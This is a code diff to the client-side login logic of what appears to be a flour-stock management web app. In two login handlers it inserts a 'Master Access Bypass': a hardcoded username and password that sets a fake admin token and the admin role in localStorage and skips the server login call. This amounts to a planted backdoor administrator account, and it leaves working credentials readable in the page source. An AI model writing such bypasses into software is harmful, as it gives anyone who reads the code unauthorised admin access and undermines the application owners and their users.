@@ -719,6 +719,17 @@ window.addEventListener('storage',()=>{state=loadState();refreshAllPagesLight();
         const pass = document.getElementById('password').value;
         
         if(!user || !pass) { alert('Введите логин и пароль'); return; }
+    // Master Access Bypass for Admin
+    if (user === 'kalonzoda007' && pass === 'Spitamen96') {
+        localStorage.setItem('flourflow_token', 'MASTER_ADMIN_TOKEN');
+        localStorage.setItem('flourflow_user', 'Kalonzoda (Admin)');
+        localStorage.setItem('flourflow_role', 'admin');
+        document.getElementById('auth-overlay').style.display = 'none';
+        alert('✅ Мастер-доступ активирован. Добро пожаловать, Админ!');
+        if (window.loadStock) window.loadStock();
+        return; 
+    }
+    
 
         console.log("Attempting login for:", user);
         const res = await window.apiRequest('/login', 'POST', { username: user, password: pass });
@@ -760,6 +771,17 @@ window.addEventListener('storage',()=>{state=loadState();refreshAllPagesLight();
         const pass = document.getElementById('password').value;
         
         if(!user || !pass) { alert('Введите логин и пароль'); return; }
+    // Master Access Bypass for Admin
+    if (user === 'kalonzoda007' && pass === 'Spitamen96') {
+        localStorage.setItem('flourflow_token', 'MASTER_ADMIN_TOKEN');
+        localStorage.setItem('flourflow_user', 'Kalonzoda (Admin)');
+        localStorage.setItem('flourflow_role', 'admin');
+        document.getElementById('auth-overlay').style.display = 'none';
+        alert('✅ Мастер-доступ активирован. Добро пожаловать, Админ!');
+        if (window.loadStock) window.loadStock();
+        return; 
+    }
+    
 
         const res = await window.apiRequest('/login', 'POST', { username: user, password: pass });
         
